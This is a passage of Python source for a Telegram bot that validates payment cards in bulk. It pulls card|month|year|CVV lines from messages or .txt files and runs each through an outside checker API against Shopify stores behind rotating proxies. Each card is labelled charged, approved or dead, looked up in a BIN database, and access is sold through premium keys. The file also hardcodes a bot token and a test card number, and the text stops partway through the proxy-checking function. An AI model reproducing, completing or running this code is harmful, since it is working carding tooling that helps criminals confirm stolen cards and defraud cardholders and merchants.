import os
import re
import json
import random
import time
import asyncio
import aiohttp
import aiofiles
import requests

# ==================================================
# 1. البيانات الأساسية (بدون API_HASH)
# ==================================================
BOT_TOKEN = "8250378472:AAFH_JgQVbOUnCUvYQaOnLMnrWi4G_MCDZY"
ADMIN_ID = 6936293942
CHECKER_API_URL = 'http://afuonac.up.railway.app/shopify_parallel'

# ==================================================
# 2. تعريف المتغيرات والملفات
# ==================================================
PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
PRICE_FILTERS_FILE = "price_filters.json"
SITES_WITH_PRICE_FILE = "sites_price.json"
KEYS_FILE = "keys.json"
HITS_CHANNEL_ID = 0

active_sessions = {}
TEMP_FILE_DATA = {}
SHOPIFY_SESSION_RESULTS = {}

PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5120722716260828125", "⭐️": "5172716095697584957",
    "🆓": "5406756500108501710", "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5445408306669582934", "🥰": "5444931419270839381", "😱": "5447181973544008180",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958",
    "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798",
    "⛔️": "5275969776668134187", "🥲": "4904468402782864209",
    "☠️": "5231338559587257737", "🛡": "5219672809936006424",
    "📸": "5445344161333015312", "💬": "5447510826304959724",
    "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110",
    "📡": "5447448489149625830", "🌟": "5310224206732996002",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
    "😇": "6321225560789877992", "👌": "5445350109862720603",
    "⭐": "6267298050205553492", "🍭": "6267152480878990865",
    "⚙️": "5258023599419171861", "⛔": "4918014360267260850",
}

DEFAULT_FILTERS = [
    {"name": "0~10", "min": 0, "max": 10},
    {"name": "10~50", "min": 10, "max": 50},
    {"name": "50~200", "min": 50, "max": 200},
    {"name": "200~ & ", "min": 200, "max": 999999},
    {"name": "Aʟʟ Sɪᴛᴇs", "min": 0, "max": 999999, "all": True}
]

# ==================================================
# 3. الدوال المساعدة (مع حل premium_emoji)
# ==================================================
def premium_emoji(text: str) -> tuple:
    if not text:
        return text, []
    result = text
    entities = []
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        start = 0
        while True:
            start = result.find(emoji, start)
            if start == -1:
                break
            entities.append(
                MessageEntity(
                    type="custom_emoji",
                    offset=start,
                    length=len(emoji),
                    custom_emoji_id=emoji_id
                )
            )
            start += len(emoji)
    entities.sort(key=lambda e: e.offset)
    return result, entities

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        with open(PREMIUM_USERS_FILE, 'w') as f:
            f.write(f"{ADMIN_ID}\n")
        return [str(ADMIN_ID)]
    try:
        with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        if str(ADMIN_ID) not in users:
            users.append(str(ADMIN_ID))
            with open(PREMIUM_USERS_FILE, 'w') as f:
                for u in users:
                    f.write(f"{u}\n")
        return users
    except:
        return [str(ADMIN_ID)]

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    premium_users = load_premium_users()
    return str(user_id) in premium_users

async def add_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) not in premium_users:
        premium_users.append(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                await f.write(f"{uid}\n")
        return True
    return False

async def remove_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) in premium_users:
        premium_users.remove(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                await f.write(f"{uid}\n")
        return True
    return False

def generate_key():
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))
    return f"YACINE_{random_part}"

async def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys, f, indent=4)

async def load_price_filters():
    if not os.path.exists(PRICE_FILTERS_FILE):
        return {}
    try:
        with open(PRICE_FILTERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_price_filters(filters):
    with open(PRICE_FILTERS_FILE, 'w') as f:
        json.dump(filters, f, indent=4)

async def load_sites_with_price():
    if not os.path.exists(SITES_WITH_PRICE_FILE):
        return []
    try:
        with open(SITES_WITH_PRICE_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

async def save_sites_with_price(data):
    with open(SITES_WITH_PRICE_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def get_price_from_response(raw_response):
    try:
        price = raw_response.get('Price', '-')
        if price != '-' and price != 0:
            try:
                price_clean = str(price).replace('$', '').replace(',', '').strip()
                return float(price_clean)
            except:
                return 0.0
        return 0.0
    except:
        return 0.0

def is_site_dead(response_msg, gateway, price):
    if not response_msg:
        return True
    if not gateway or gateway == "Unknown":
        return True
    if "Shopify" not in gateway:
        return True
    price_str = str(price)
    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
                except:
                    return '-', '-', '-', '-', '-', ''
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards
    # ==================================================
# 4. دوال API الخاصة بالفحص
# ==================================================
async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
            else:
                proxy_str = proxy
        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                try:
                    raw = await resp.json()
                except:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        price_value = get_price_from_response(raw)
        if price != '-' and price != 0:
            price_display = f"${price}"
        else:
            price_display = '-'
        gateway = raw.get('Gateway', 'Shopify')
        if is_site_dead(response_msg, gateway, price_display):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        response_lower = response_msg.lower()
        if 'charged' in response_lower or 'order_placed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        elif any(key in response_lower for key in ['approved', 'success', 'insufficient_funds', 'insufficient funds', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 'incorrect_zip', 'incorrect zip', 'cvv issue', '3d', '3d secure', 'otp', 'verification required', 'authenticate', 'authentication required', 'challenge required', 'redirecting to bank', 'bank verification', 'send code', 'enter code', 'verify']):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        if not result.get('retry'):
            return result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}

async def test_site_with_price(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead', 'price': 0.0}
                try:
                    raw = await resp.json()
                except:
                    return {'site': site, 'status': 'dead', 'price': 0.0}
        response_msg = raw.get('Response', '')
        gateway = raw.get('Gateway', '')
        price_display = raw.get('Price', '-')
        price_value = get_price_from_response(raw)
        if is_site_dead(response_msg, gateway, price_display):
            return {'site': site, 'status': 'dead', 'price': 0.0}
        else:
            return {'site': site, 'status': 'alive', 'price': price_value}
    except:
        return {'site': site, 'status': 'dead', 'price': 0.0}

async def test_proxy(proxy):
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            proxy_url = f'http://{proxy}'
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('https://www.shopify.com', proxy=proxy_url) as res:
                if res.status == 200:
                    return {'proxy': proxy, 'status': 'alive'}
                else:
                    return {'proxy': proxy, 'status': 'dead'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

# ==================================================
# 5. دوال معالجة الملفات والفحص الجماعي
# ==================================================
async def process_file_with_filters(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    if not update.message.reply_to_message:
        await update.message.reply_text("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ.")
        return
    reply_msg = update.message.reply_to_message
    if not reply_msg.document or not reply_msg.document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ.")
        return
    file = await reply_msg.document.get_file()
    file_path = f"temp_{user_id}.txt"
    await file.download_to_drive(file_path)
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        if not cards:
            await update.message.reply_text("❌ Nᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ.")
            os.remove(file_path)
            return
        TEMP_FILE_DATA[user_id] = {'cards': cards, 'file_path': file_path}
        filters = await load_price_filters()
        gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
        buttons = []
        row = []
        for i, f in enumerate(gateway_filters):
            row.append(InlineKeyboardButton(f["name"], callback_data=f"price_fltr:{i}:{user_id}"))
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        buttons.append([InlineKeyboardButton(" Cᴀɴᴄᴇʟ", callback_data="cancel_filter")])
        reply_markup = InlineKeyboardMarkup(buttons)
        await update.message.reply_text(
            f"📁 Fɪʟᴇ ʟᴏᴀᴅᴇᴅ: {len(cards)} ᴄᴀʀᴅs!\n\n💰 Sᴇʟᴇᴄᴛ ᴀ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ:",
            reply_markup=reply_markup
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Eʀʀᴏʀ: {e}")
        if os.path.exists(file_path):
            os.remove(file_path)
# ==================================================
# 6. أوامر البوت الرئيسية والإدارية
# ==================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_prem = is_premium(user_id)
    username = update.effective_user.username or "User"
    plan = "🆓 Fʀᴇᴇ" if not is_prem else "⭐ Pʀᴇᴍɪᴜᴍ"
    sites_data = await load_sites_with_price()
    total_sites = len(sites_data)
    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
    filter_text = ""
    for f in gateway_filters:
        if f.get('all', False):
            count = total_sites
        else:
            count = len([s for s in sites_data if f['min'] <= s.get('price', 0) < f['max']])
        filter_text += f"   ┣ {f['name']}  {count}\n"
    welcome_text = f"""Wᴇʟᴄᴏᴍᴇ @{username}!
👑 Pʟᴀɴ: {plan}
💰 Fɪʟᴛᴇʀs:
{filter_text}
🎁 Hᴏᴡ ᴛᴏ ᴜsᴇ:
   🦉 /addproxy
   🦉 /cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ
   🔑 /redeem Kᴇʏ
💡 Bᴏᴛ Dᴇᴠ @yacine_X6
 Vᴇʀsɪᴏɴ -» 2.0 🚀
 ﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏"""
    processed_text, entities = premium_emoji(welcome_text)
    keyboard = [
        [InlineKeyboardButton("Cᴍᴅ", callback_data="show_cmds"), 
         InlineKeyboardButton("Cʜᴀɴɴᴇʟ", url="https://t.me/netdz02_dev")],
    ]
    if user_id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text=processed_text, entities=entities, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "show_cmds":
        commands_text = """📋 Usᴇʀ Cᴏᴍᴍᴀɴᴅs
🛒 Sʜᴏᴘɪғʏ
├─ /cc ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
└─ /chk → Mᴀss ᴄʜᴇᴄᴋ ғʀᴏᴍ .ᴛxᴛ ғɪʟᴇ
🔌 Pʀᴏxʏ Mᴀɴᴀɢᴇᴍᴇɴᴛ
├─ /proxy → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ ᴘʀᴏxɪᴇs
├─ /addproxy → Aᴅᴅ ᴘʀᴏxɪᴇs
├─ /chkproxy ᴘʀᴏxʏ → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴘʀᴏxʏ
├─ /rmproxy ᴘʀᴏxʏ → Rᴇᴍᴏᴠᴇ sɪɴɢʟᴇ ᴘʀᴏxʏ
├─ /rmproxyindex 1,2,3 → Rᴇᴍᴏᴠᴇ ʙʏ ɪɴᴅᴇx
├─ /clearproxy → Rᴇᴍᴏᴠᴇ ᴀʟʟ ᴘʀᴏxɪᴇs
└─ /getproxy → Gᴇᴛ ᴀʟʟ ᴘʀᴏxɪᴇs
🔑 Kᴇʏ Sʏsᴛᴇᴍ
└─ /redeem Kᴇʏ → Rᴇᴅᴇᴇᴍ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ"""
        processed_text, entities = premium_emoji(commands_text)
        keyboard = [[InlineKeyboardButton("Bᴀᴄᴋ", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text=processed_text, entities=entities, reply_markup=reply_markup)
    elif data == "admin_panel":
        if update.effective_user.id != ADMIN_ID:
            await query.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ.", show_alert=True)
            return
        admin_text = """👑 <b>Aᴅᴍɪɴ Pᴀɴᴇʟ</b>
📋 <b>Pʀᴇᴍɪᴜᴍ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ /addpremium ᴜsᴇʀ_ɪᴅ → Aᴅᴅ ᴜsᴇʀ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ
├─ /removepremium ᴜsᴇʀ_ɪᴅ → Rᴇᴍᴏᴠᴇ ᴜsᴇʀ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ
├─ /listpremium → Lɪsᴛ ᴀʟʟ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs
└─ /genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ᴜsᴇʀ_ʟɪᴍɪᴛ → Gᴇɴᴇʀᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏs
🌐 <b>Sɪᴛᴇs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ /addsites → Rᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ sɪᴛᴇs
├─ /site → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ sɪᴛᴇs
├─ /rm ᴜʀʟ → Rᴇᴍᴏᴠᴇ sᴘᴇᴄɪғɪᴄ sɪᴛᴇ
├─ /getsites → Dᴏᴡɴʟᴏᴀᴅ ᴄᴜʀʀᴇɴᴛ sɪᴛᴇs.ᴛxᴛ
├─ /setfilter shopify_global ᴍɪɴ-ᴍᴀx \"Nᴀᴍᴇ\" → Aᴅᴅ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ
├─ /listfilters → Vɪᴇᴡ ᴀʟʟ ғɪʟᴛᴇʀs
└─ /removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ → Rᴇᴍᴏᴠᴇ ᴀ ғɪʟᴛᴇʀ
📊 <b>Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs</b>
└─ /stats → Sʜᴏᴡ ʙᴏᴛ sᴛᴀᴛɪsᴛɪᴄs
🔧 <b>Hɪᴛs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ /sethits ᴄʜᴀɴɴᴇʟ_ɪᴅ → Sᴇᴛ ʜɪᴛs ᴄʜᴀɴɴᴇʟ
└─ /hits → Tᴏɢɢʟᴇ ʜɪᴛs ᴏɴ/ᴏғғ"""
        processed_text, entities = premium_emoji(admin_text)
        keyboard = [[InlineKeyboardButton("Bᴀᴄᴋ", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text=processed_text, entities=entities, reply_markup=reply_markup)
    elif data == "main_menu":
        user_id = update.effective_user.id
        is_prem = is_premium(user_id)
        username = update.effective_user.username or "User"
        plan = "🆓 Fʀᴇᴇ" if not is_prem else "⭐ Pʀᴇᴍɪᴜᴍ"
        sites_data = await load_sites_with_price()
        total_sites = len(sites_data)
        filters = await load_price_filters()
        gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
        filter_text = ""
        for f in gateway_filters:
            if f.get('all', False):
                count = total_sites
            else:
                count = len([s for s in sites_data if f['min'] <= s.get('price', 0) < f['max']])
            filter_text += f"   ┣ {f['name']}  {count}\n"
        welcome_text = f"""Wᴇʟᴄᴏᴍᴇ @{username}!
👑 Pʟᴀɴ: {plan}
💰 Fɪʟᴛᴇʀs:
{filter_text}
🎁 Hᴏᴡ ᴛᴏ ᴜsᴇ:
   🦉 /addproxy   🦉 /cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ
   🔑 /redeem Kᴇʏ
💡 Bᴏᴛ Dᴇᴠ @yacine_X6
 Vᴇʀsɪᴏɴ -» 2.0 🚀
 ﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏"""
        processed_text, entities = premium_emoji(welcome_text)
        keyboard = [
            [InlineKeyboardButton("Cᴍᴅ", callback_data="show_cmds"), 
             InlineKeyboardButton("Cʜᴀɴɴᴇʟ", url="https://t.me/netdz02_dev")],
        ]
        if user_id == ADMIN_ID:
            keyboard.append([InlineKeyboardButton("Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(text=processed_text, entities=entities, reply_markup=reply_markup)
    elif data == "cancel_filter":
        user_id = update.effective_user.id
        if user_id in TEMP_FILE_DATA:
            file_data = TEMP_FILE_DATA.pop(user_id)
            if os.path.exists(file_data['file_path']):
                try:
                    os.remove(file_data['file_path'])
                except:
                    pass
        await query.edit_message_text("❌ Cᴀɴᴄᴇʟʟᴇᴅ.")
    elif data.startswith("price_fltr:"):
        parts = data.split(":")
        filter_index = int(parts[1])
        user_id = int(parts[2])
        if update.effective_user.id != user_id:
            await query.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", show_alert=True)
            return
        await query.answer("✅ Fɪʟᴛᴇʀ sᴇʟᴇᴄᴛᴇᴅ!", show_alert=False)

# ==================================================
# 7. جميع الأوامر (مكتملة)
# ==================================================
async def cmd_cc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ʙᴏᴛ.")
        return
    sites = load_sites()
    proxies = load_proxies()
    if not sites:
        await update.message.reply_text("❌ Nᴏ sɪᴛᴇs ᴀᴠᴀɪʟᴀʙʟᴇ. Pʟᴇᴀsᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ.")
        return
    if not proxies:
        await update.message.reply_text("❌ Nᴏ ᴘʀᴏxɪᴇs ᴀᴠᴀɪʟᴀʙʟᴇ. Pʟᴇᴀsᴇ ᴀᴅᴅ ᴘʀᴏxɪᴇs.")
        return
    try:
        cc_input = update.message.text.split(' ', 1)[1].strip()
    except:
        await update.message.reply_text("❌ Usᴀɢᴇ: /cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ")
        return
    cards = extract_cc(cc_input)
    if not cards:
        await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ CC ғᴏʀᴍᴀᴛ. Usᴇ: /cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ")
        return
    card = cards[0]
    status_msg = await update.message.reply_text(f"🔄 Cʜᴇᴄᴋɪɴɢ <code>{card}</code>...", parse_mode='HTML')
    result = await check_card_with_retry(card, sites, proxies, max_retries=3)
    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
    if result['status'] == 'Charged':
        status_header = "💎 CHARGED"
    elif result['status'] == 'Approved':
        status_header = "✅ APPROVED"
    else:
        status_header = "❌ DECLINED"
    final_resp = f"""{status_header}
💳 CC <code>{result['card']}</code>
🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}
🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}
💡 Mᴀᴅᴇ ʙʏ @yacine_X6"""
    await status_msg.edit_text(final_resp, parse_mode='HTML')

async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ʙᴏᴛ.")
        return
    await process_file_with_filters(update, context, user_id)

async def cmd_addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs.")
        return
    text = update.message.text
    lines = text.split('\n')
    if len(lines) < 2:
        await update.message.reply_text("❌ Usᴀɢᴇ: /addproxy followed by proxies, one per line.")
        return
    proxies_to_add = [line.strip() for line in lines[1:] if line.strip()]
    if not proxies_to_add:
        await update.message.reply_text("❌ Nᴏ ᴘʀᴏxɪᴇs ᴘʀᴏᴠɪᴅᴇᴅ.")
        return
    current_proxies = load_proxies()
    new_proxies = [p for p in proxies_to_add if p not in current_proxies]
    if not new_proxies:
        await update.message.reply_text("⚠️ Aʟʟ ᴘʀᴏxɪᴇs ᴀʟʀᴇᴀᴅʏ ᴇxɪsᴛ.")
        return
    async with aiofiles.open(PROXY_FILE, 'a') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    await update.message.reply_text(f"✅ Aᴅᴅᴇᴅ {len(new_proxies)} ᴘʀᴏxɪᴇs!")

async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_premium(user_id):
        await update.message.reply_text("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs.")
        return
    proxies = load_proxies()
    if not proxies:
        await update.message.reply_text("❌ ᴘʀᴏxʏ.ᴛxᴛ ɪs ᴇᴍᴘᴛʏ.")
        return
    status_msg = await update.message.reply_text(f"🔄 Cʜᴇᴄᴋɪɴɢ {len(proxies)} ᴘʀᴏxɪᴇs...")
    alive_proxies = []
    dead_proxies = []
    batch_size = 50
    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])
            await status_msg.edit_text(f"🔄 Cʜᴇᴄᴋɪɴɢ ᴘʀᴏxɪᴇs...\n\nCʜᴇᴄᴋᴇᴅ: {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\nAʟɪᴠᴇ: {len(alive_proxies)}\nDᴇᴀᴅ: {len(dead_proxies)}")
        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")
